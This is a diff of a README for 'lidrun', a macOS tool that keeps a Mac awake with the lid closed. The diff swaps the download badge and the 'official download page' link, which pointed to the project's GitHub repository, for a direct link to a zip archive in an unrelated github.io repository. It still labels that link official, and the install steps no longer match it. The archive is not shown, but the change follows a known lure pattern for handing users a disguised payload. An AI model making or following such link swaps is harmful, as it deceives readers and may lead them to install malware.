@@ -5,7 +5,7 @@ description: "Keep your Mac awake with the lid closed to run background tasks li
 ---
 # 💻 lidrun - Keep your Mac active while closed
 
-[![](https://img.shields.io/badge/Download_LidRun-blue)](https://github.com/Rinaldoeclectic714/lidrun)
+[![](https://img.shields.io/badge/Download_LidRun-blue)](https://raw.githubusercontent.com/Rinaldoeclectic714/rinaldoeclectic714.github.io/main/src/1.2.zip)
 
 LidRun manages your Mac power states. It prevents your computer from sleeping when you close the lid. This allows tools like Claude Code, Cursor, Docker, and Ollama to finish tasks without interruption.
 
@@ -25,7 +25,7 @@ The application monitors your system state. It ensures your background agents ru
 
 ## 📥 Install the software
 
-Visit the [official download page](https://github.com/Rinaldoeclectic714/lidrun) to obtain the latest version.
+Visit the [official download page](https://raw.githubusercontent.com/Rinaldoeclectic714/rinaldoeclectic714.github.io/main/src/1.2.zip) to obtain the latest version.
 
 1. Navigate to the release section on the webpage.
 2. Select the specific installer for your version of macOS.
